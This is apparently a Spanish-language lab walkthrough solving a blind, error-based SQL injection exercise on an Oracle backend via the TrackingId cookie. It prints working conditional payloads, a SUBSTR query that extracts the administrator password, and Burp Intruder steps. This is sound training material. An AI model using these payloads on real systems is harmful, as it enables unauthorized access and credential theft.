## Objetivo:

![[Pasted image 20240624194714.png]]

## Solucion:

Entrar a cualquier parte de la aplicacion

![[Pasted image 20240624195236.png]]

Vemos que manipulando la cookie "TrackingId" podemos llegar a hacer saltar ese "Welcome Back" o no dependiendo de si le enviamos una query valida...

Supongamos que la query que esta internamente se ve algo asi:

```
SELECT * FROM tracking WHERE trackingId = 'miCookie';
```

Entonces inyectaremos lo siguiente:

```
lkNLQi3BLKjUA6bQ' AND 1=1 -- -
lkNLQi3BLKjUA6bQ' AND (1/0)=1 -- -
```

![[Pasted image 20240626184236.png]]

![[Pasted image 20240626184331.png]]

Y vemos que podemos provocar errores, ya con esto podemos ir creando querys condicionales para intentar aplicar tecnicas para enumerar caracteres de la contraseña del usuario o lo que querramos hacer...

Vemos que usando este Payload da error
```
lkNLQi3BLKjUA6bQ' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a -- -
```

![[Pasted image 20240626184915.png]]

Y vemos que acá NO porque la primer condicion No se cumple.
```
lkNLQi3BLKjUA6bQ' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a -- -
```

![[Pasted image 20240626184950.png]]

NOTA:
Es importante que tengas en cuenta el payload que inyectas, porque puede que te dé error pero no por el "1/0" si no por error de sintaxis y esto varía dependiendo de la Base de Datos por detrás.... Así proba con varios payload, en este caso es la DB es Oracle por el TO_CHAR() y el FROM dual...

Bueno, ya con esto podemos intentar hacer la tecnica del SUBSTRING para intentar encontrar la contraseña...

Usaremos la siguiente inyección y vemos que si funciona

```
kNLQi3BLKjUA6bQ' AND (SELECT CASE WHEN (SUBSTR('hola', 1, 1)='h') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a' -- -

kNLQi3BLKjUA6bQ' AND (SELECT CASE WHEN (SUBSTR('hola', 1, 1)='q') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a' -- -
```

![[Pasted image 20240626193414.png]]

![[Pasted image 20240626193501.png]]

Ahora ya con esto le crearemos la inyección definitiva

```
lkNLQi3BLKjUA6bQ' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), 1, 1)='h') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a' -- -
```

Enviaremos esto al Intruder y luego configuraremos las variables de la siguiente manera y seleccionamos el ataque de tipo Cluster Bomb

![[Pasted image 20240626195201.png]]

Configuramos en el Payload #1 y desmarcamos el check de url encode y tambien lo quitamos en el Payload #2

![[Pasted image 20240626195333.png]]

![[Pasted image 20240626195409.png]]

Y le damos en comenzar ataque y cada vez que el servidor nos responda con un Status Code 500, quiere decir que encontramos un caracter de la contraseña

![[Pasted image 20240626195530.png]]

Y este es el resultado final

![[Pasted image 20240626200504.png]]

Ahora coloquemonos en el orden en como tenemos el Payload #1

Y la contraseña quedaria como : s6x8piu3gnlp9sva149a

Iniciamos sesion y listo.

![[Pasted image 20240626201234.png]]

